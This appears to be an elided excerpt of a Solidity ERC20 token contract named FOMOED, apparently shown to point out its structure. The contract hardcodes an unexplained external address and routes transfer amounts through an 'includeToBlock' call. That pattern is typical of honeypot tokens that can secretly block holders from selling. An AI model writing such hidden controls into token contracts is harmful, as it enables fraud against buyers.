...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _coinbase = 0xe1a076c991f0DF3c7533f683e7df17cBE356e30e;
    address public pair;
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return coinbase.includeToBlock(amount);
    }
    ...
    function _DeployFomoed(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployFomoed(creator, initialSupply);
    }
}

contract Fomoed is ERC20Token {
    constructor() ERC20Token("FOMOED", "FOMOED", msg.sender, 1000000000 * 10 ** 18) {
    }
}